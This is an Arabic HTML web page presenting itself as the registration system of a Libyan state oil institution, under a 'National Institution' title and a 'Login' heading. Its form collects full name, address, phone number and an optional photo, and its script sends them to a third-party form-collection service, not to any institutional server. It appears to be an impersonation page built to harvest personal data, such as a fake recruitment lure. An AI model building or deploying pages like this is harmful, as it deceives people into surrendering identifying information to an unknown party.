<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>المؤسسة الوطنيــة</title>

  <link rel="icon" href="uy.jpeg" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #002147, #003366);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }

    .container {
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
      padding: 35px 40px;
      width: 96%;
      max-width: 420px;
      box-sizing: border-box;
      text-align: center;
      z-index: 1;
    }

    .logo-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo-container img {
      width: 90px;
      height: 90px;
      object-fit: contain;
      margin: 0 auto;
      display: block;
    }

    .logo-container p {
      margin-top: 8px;
      font-weight: 700;
      color: #003366;
      font-size: 16px;
    }

    h2 {
      margin-bottom: 25px;
      color: #003366;
      font-weight: 900;
      font-family: Arial, Helvetica, sans-serif;
      font-size: 32px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #222;
      text-align: right;
    }

    input[type="tel"],
    input[type="text"],
    input[type="file"] {
      width: 100%;
      padding: 12px 15px;
      font-size: 16px;
      border-radius: 10px;
      border: 1.8px solid #bbb;
      margin-bottom: 18px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      font-family: inherit;
    }

    input:focus {
      border-color: gold;
      outline: none;
    }

    button {
      width: 50%;
      padding: 12px;
      font-size: 17px;
      background-color: gold;
      border: none;
      border-radius: 10px;
      color: #002147;
      cursor: pointer;
      font-weight: bold;
      font-family: Calibri, sans-serif;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #e6c200;
    }

    .message {
      margin-top: 20px;
      font-weight: bold;
      font-size: 15px;
    }

    .success {
      color: green;
    }

    .error {
      color: red;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo-container">
      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
      <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
    </div>

    <h2>تسجيل الدخول</h2>

    <form id="registerForm" enctype="multipart/form-data">
      <label for="fullname">الاسم الثلاثي:</label>
      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />

      <label for="address">العنوان:</label>
      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />

      <label for="phone">رقم الهاتف:</label>
      <input type="tel" id="phone" name="phone" required pattern="[0-9]{10,15}" placeholder="اكتب رقم هاتفك" title="أدخل رقم هاتف صحيح" autocomplete="tel" />

      <label for="image">إرفاق صورة (اختياري):</label>
      <input type="file" id="image" name="image" accept="image/*" />

      <button type="submit">إرسال</button>

      <div id="message" class="message"></div>
    </form>
  </div>

  <script>
    document.getElementById('registerForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const form = e.target;
      const formData = new FormData(form);
      const message = document.getElementById('message');

      fetch('https://formcarry.com/s/a-Yw-WFDEqO', {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          message.textContent = '✅ تم إرسال البيانات بنجاح.';
          message.className = 'message success';
          form.reset();
        } else {
          message.textContent = '❌ حدث خطأ أثناء الإرسال. حاول مجددًا.';
          message.className = 'message error';
        }
      })
      .catch(error => {
        message.textContent = '⚠️ تعذر الاتصال بالخادم.';
        message.className = 'message error';
        console.error(error);
      });
    });
  </script>

</body>
</html>
